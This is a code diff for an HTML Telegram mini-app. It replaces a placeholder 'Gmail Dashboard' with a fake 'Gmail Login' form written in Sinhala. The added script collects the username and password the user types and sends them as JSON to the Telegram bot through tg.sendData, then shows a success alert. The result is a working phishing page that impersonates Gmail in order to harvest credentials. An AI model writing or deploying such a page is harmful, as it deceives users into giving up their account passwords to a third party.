@@ -1,23 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="si">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Dashboard</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #0e1621; color: white; padding: 20px; text-align: center; }
-        .box { border: 2px solid #2481cc; padding: 20px; border-radius: 15px; margin-top: 50px; }
+        body { font-family: 'Arial', sans-serif; background-color: #0e1621; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        h1 { color: #ff9800; }
+        .container { width: 85%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #17212b; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #ff9800; color: #000; font-weight: bold; cursor: pointer; }
+        .register-btn { background: #2481cc; color: white; }
     </style>
 </head>
 <body>
-    <h1>Gmail Dashboard</h1>
-    <div class="box">
-        <p>ඔබේ ගිණුම් තොරතුරු මෙතන පෙනෙනු ඇත.</p>
-        <button id="closeBtn">වසා දමන්න</button>
+    <div class="container">
+        <h1>Gmail Login</h1>
+        <p>පරිශීලක නාමය සහ මුරපදය ඇතුළත් කරන්න</p>
+        <input type="text" id="username" placeholder="පරිශීලක නාමය">
+        <input type="password" id="password" placeholder="මුරපදය">
+        <button onclick="submitData()">පිවිසෙන්න</button>
+        <button class="register-btn">ගිණුමක් සාදන්න (Register)</button>
     </div>
+
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        document.getElementById('closeBtn').addEventListener('click', () => { tg.close(); });
+
+        function submitData() {
+            let user = document.getElementById('username').value;
+            let pass = document.getElementById('password').value;
+            tg.sendData(JSON.stringify({username: user, password: pass}));
+            alert("සාර්ථකව යවන ලදී!");
+        }
     </script>
 </body>
 </html>
